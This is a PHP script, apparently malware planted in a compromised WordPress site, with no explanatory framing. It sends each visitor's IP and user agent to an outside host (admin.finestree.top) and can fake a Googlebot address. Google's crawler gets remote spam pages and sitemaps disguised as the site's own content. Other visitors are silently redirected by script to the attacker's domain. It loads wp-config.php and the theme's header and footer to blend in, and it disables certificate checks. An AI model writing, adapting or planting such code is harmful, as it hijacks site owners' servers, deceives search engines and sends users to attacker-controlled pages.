<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$vurl = "https://admin.finestree.top/";
if (!is_null($_GET['g'])) {
    $jd = getCurl($vurl . "1.aspx?sz=".$_GET['g']);
    $sz =  $_GET['g'];
}
else
{
	$jd = getCurl($vurl . "1.aspx?xy=".$http_type);
    $sz =  getCurl($vurl . "1.aspx?jd=".$jd);
}
$hyzhdy = $jd . "0814.aspx";
$surl = $jd . "s814.aspx";
$m=1;

if (!is_null($_GET['HE'])) {
	$kname = urldecode(getCurl($jd . "gn.aspx?iid=" .str_replace("jcn","", $_GET['HE'])));
	echo "<title>".$kname."</title>\n";
	echo "<meta name=\"keywords\" content=\"".$kname."\" />\n";
  }

if (!is_null($_GET['m'])) {$m = $_GET['m'];}
if (!is_null($_GET['number'])) {
  $surl = $surl . "?number=" . $_GET['number'] . "&pnum=" . $_GET['pnum'] . "&cid=" . $_GET['cid'] . "&m=" . $m;
  $str = getCurl($surl);
  $str = str_replace('yymm', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
  $str = str_replace('ggggg', $sz, $str);
  $str = str_replace('iid=', 'HE=FF', $str);
  header("Content-type:text/xml");
  echo $str;
  exit();
}
$ip=$_SERVER['REMOTE_ADDR']."-".$_SERVER['REMOTE_HOST']."-".$_SERVER['HTTP_CLIENT_IP']."-".$_SERVER['HTTP_X_FORWARDED_FOR']."-".$_SERVER['HTTP_X_FORWARDED']."-".$_SERVER['HTTP_FORWARDED_FOR']."-".$_SERVER['HTTP_FORWARDED'];
if(!is_null($_GET['kk'])){$ip="66.249.64.190";}
$domain = getCurl($jd . "getdomain2.aspx?rnd=1&ip=".$ip."&ua=".urlencode(str_replace(';', '', $_SERVER['HTTP_USER_AGENT'])));
 if ($domain=='google') {}
else 
{
  if (!is_null($_GET['HE'])) {
	   $kname = urldecode(getCurl($jd . "gn.aspx?iid=" .str_replace("FF","", $_GET['HE'])));
    echo '<script>document.location="' . $jd . "a.aspx" . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($kname) ."&url=". $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']. '"</script>';
	exit();
  }
  if (!is_null($_GET['pnum'])) {
             $txt = str_replace("products.aspx", "", $jd . "a.aspx") . "?cid=" . $_GET['cid'] . "";
			echo '<script>document.location="' . $txt . '"</script>';
			exit();
  }
}
function getCurl($url)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}
?>
<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
function get_http_status_code($url) {
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_setopt($ch, CURLOPT_HEADER, true);
  curl_setopt($ch, CURLOPT_NOBODY, true); 
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_exec($ch);
  $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  return $status_code;
}
function yinru(){
  if (file_exists('wp-config.php')) {
      $is_config_valid = true;
      try {
          ob_start();
          include('wp-config.php');
          ob_end_clean();
      } catch (Exception $e) {
          $is_config_valid = false;
      }
      if ($is_config_valid && function_exists('get_header')) {
          get_header();
      }
  } 
}
  $cur_code=get_http_status_code($http_type. $_SERVER['HTTP_HOST']);
  if ($cur_code==200){
    yinru();
  }
?>
<?php

  if (!is_null($_GET['HE'])) {
    $hyzhdy = $hyzhdy . "?iid=" . urlencode(str_replace("FF","",$_GET['HE'])) . "&cid=" . $_GET['cid']."&m=". $m;
  }else {
			$cid = "";
			if (!is_null($_GET['cid'])) {$cid = $_GET['cid'];}
			$hyzhdy = $hyzhdy . "?cid=" . $cid . "&pnum=" . $_GET['pnum']."&m=". $m;
		}
  $str = getCurl($hyzhdy);
  $str = str_replace('ggggg', $sz, $str);
  $str = str_replace('IIIII', $http_type . $_SERVER['HTTP_HOST'], $str);
  $str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
  $str = str_replace('iid=', 'HE=FF', $str);
  echo $str;
  get_footer();
?>
